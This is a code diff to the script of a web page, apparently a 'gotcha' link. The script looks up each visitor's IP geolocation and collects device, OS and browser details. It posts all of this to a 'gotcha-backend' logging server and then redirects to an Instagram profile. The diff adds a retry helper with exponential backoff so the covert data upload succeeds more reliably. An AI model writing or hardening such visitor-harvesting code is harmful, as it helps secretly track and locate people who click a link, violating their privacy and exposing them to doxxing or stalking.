@@ -68,6 +68,20 @@
       });
     }
 
+    // Retry helper with exponential backoff
+    async function fetchWithRetry(url, options = {}, retries = 3) {
+      let delay = 500;
+      for (let attempt = 0; attempt < retries; attempt++) {
+        try {
+          return await fetch(url, options);
+        } catch (err) {
+          if (attempt === retries - 1) throw err;
+          await new Promise(res => setTimeout(res, delay));
+          delay *= 2; // exponential backoff
+        }
+      }
+    }
+
     countdownEl.style.display = "block";
     logVisitor();
 
@@ -79,28 +93,30 @@
 
       let ipData = {};
       try {
-        const res = await fetch("https://api.db-ip.com/v2/free/self");
+        const res = await fetchWithRetry("https://api.db-ip.com/v2/free/self");
         ipData = await res.json();
       } catch {}
 
-      const postToBackend = () => {
-        fetch("https://gotcha-backend.onrender.com/log", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            ...userData,
-            ip: ipData.ipAddress,
-            city: ipData.city,
-            region: ipData.stateProv,
-            country: ipData.countryName,
-            device: isMobile ? "Mobile" : "Desktop",
-            os: os,
-            browser: browser
-          })
-        }).finally(() => {
+      const postToBackend = async () => {
+        try {
+          await fetchWithRetry("https://gotcha-backend.onrender.com/log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              ...userData,
+              ip: ipData.ipAddress,
+              city: ipData.city,
+              region: ipData.stateProv,
+              country: ipData.countryName,
+              device: isMobile ? "Mobile" : "Desktop",
+              os: os,
+              browser: browser
+            })
+          });
+        } finally {
           // Always redirect
           window.location.href = "https://instagram.com/ziahiscrazyasf";
-        });
+        }
       };
 
       if ("geolocation" in navigator) {
